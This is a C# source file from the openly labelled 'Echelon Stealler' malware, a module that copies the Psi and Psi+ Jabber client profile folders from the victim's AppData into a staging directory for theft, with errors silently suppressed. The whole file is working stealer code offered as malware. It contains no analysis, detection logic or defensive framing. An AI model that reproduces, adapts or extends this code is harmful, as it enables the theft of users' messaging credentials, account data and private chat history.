///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System.IO;

namespace Echelon
{
    class Psi
    {
        public static void Start(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Psi+\\profiles\\default\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
                    file.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + file.Name);
                }
                Startjabbers.count++;
            }
            catch {}

            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Psi\\profiles\\default\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
                    file.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + file.Name);

                }
                Startjabbers.count++;
            }
            catch {}
        }   
    }
}
